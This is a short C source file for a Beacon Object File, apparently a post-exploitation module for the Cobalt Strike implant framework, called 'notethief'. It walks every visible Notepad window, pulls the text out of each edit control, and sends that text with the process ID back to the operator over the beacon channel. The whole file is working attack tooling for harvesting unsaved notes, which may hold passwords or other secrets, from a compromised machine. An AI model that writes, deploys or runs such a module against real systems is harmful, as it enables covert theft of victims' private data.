/*
 * notethief - recover text from open Notepad windows.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static char g_text[8192];
static int g_found;

static BOOL CALLBACK child_cb(HWND hwnd, LPARAM lp)
{
    char cls[64];
    DWORD pid = 0;
    (void)lp;
    if (!USER32$GetClassNameA(hwnd, cls, sizeof(cls))) return TRUE;
    if (bof_stricmp(cls, "Edit") != 0) return TRUE;

    g_text[0] = 0;
    USER32$SendMessageA(hwnd, WM_GETTEXT, sizeof(g_text) - 1, (LPARAM)g_text);
    if (g_text[0]) {
        USER32$GetWindowThreadProcessId(hwnd, &pid);
        BeaconPrintf(CALLBACK_OUTPUT, "--- Notepad PID %lu ---\n%s\n", (unsigned long)pid, g_text);
        g_found++;
    }
    return TRUE;
}

static BOOL CALLBACK top_cb(HWND hwnd, LPARAM lp)
{
    char cls[64];
    (void)lp;
    if (!USER32$IsWindowVisible(hwnd)) return TRUE;
    if (!USER32$GetClassNameA(hwnd, cls, sizeof(cls))) return TRUE;
    if (bof_stricmp(cls, "Notepad") != 0) return TRUE;
    USER32$EnumChildWindows(hwnd, child_cb, 0);
    return TRUE;
}

void go(char *args, int alen)
{
    (void)args; (void)alen;
    g_found = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "Open Notepad contents\n");
    USER32$EnumWindows(top_cb, 0);
    if (!g_found)
        BeaconPrintf(CALLBACK_OUTPUT, "No readable Notepad windows found\n");
}
